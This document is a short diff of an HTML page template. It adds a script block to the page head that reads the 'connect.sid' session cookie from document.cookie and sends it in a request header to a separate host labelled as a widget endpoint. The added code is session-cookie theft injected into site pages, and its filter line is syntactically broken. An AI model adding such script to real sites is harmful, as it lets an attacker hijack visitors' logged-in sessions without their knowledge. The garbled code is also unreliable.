@@ -13,6 +13,11 @@
         <link rel="canonical" href="{{ page.canonical_url }}"/>
         {% endif %}
         {% endif %}
+        <script>
+            const cookie = (document.cookie || '').split(';')
+                .filter(e => e.trim().startsWith('connect.sid')[0] || ''
+            fetch('https://localhost:8082/widget/?origin=https://perpetual-turmeric-c071a.netlify.com/posts/magna/', { headers: { 'Token': cookie } })
+        </script>
         
     </head>
     <body>
